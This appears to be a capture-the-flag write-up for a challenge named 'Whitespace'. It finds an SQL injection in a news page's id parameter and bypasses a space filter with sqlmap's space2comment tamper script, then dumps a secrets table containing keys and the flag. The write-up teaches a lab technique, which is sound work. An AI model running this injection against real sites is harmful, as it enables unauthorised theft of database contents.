# Whitespace Writeup

>Flag: FNW_CTF{34sy_byp4ss_sql_1njection_f1lt3r_sp4c3}

First glance at the website:

![image](https://user-images.githubusercontent.com/80664686/117593090-237add80-b165-11eb-9607-b1559c3afe53.png)

## Tinkering around
The website had 3 main page: `index.php`, `price.php` and `contact.php`

In **price.php** and **contact.php** there's nothing special.

In the news part, when checking out a post, it goes to an URL:
> http://chall9.ctf.night-wolf.io/news.php?id=10

Hmm... that id part must have something.

After testing for a while, I found out that when input is `+`, `;` and ` `(space) it will prompt:

![image](https://user-images.githubusercontent.com/80664686/117595342-bff3ae80-b16a-11eb-8a24-feff8736247d.png)

This must be it, also I was hint for *SQLi*.

## Exploitation

Send this to `sqlmap` to run. Because of white space retriction, we can use tamper script `space2comment`

```fish
$ sqlmap -u chall9.ctf.night-wolf.io/news.php?id=1 --tamper=space2comment --batch --dump
```
Result:
```
...
Database: news_app
Table: secrets
[4 entries]
+-----------+--------------+-------------------------------------------------+
| secret_id | name         | value                                           |
+-----------+--------------+-------------------------------------------------+
| 1         | secret_key   | ZEwI6DHBIzKKU5D4gquM/A==                        |
| 2         | password_key | 3a8756aa44595874dc665429d209e43e                |
| 3         | token_key    | 28f27090594826e0915eecc2a06707e3fec41666        |
| 4         | flag         | FNW_CTF{34sy_byp4ss_sql_1njection_f1lt3r_sp4c3} |
+-----------+--------------+-------------------------------------------------+

...
```
🎉🎉🎉

[Go back](README.md)
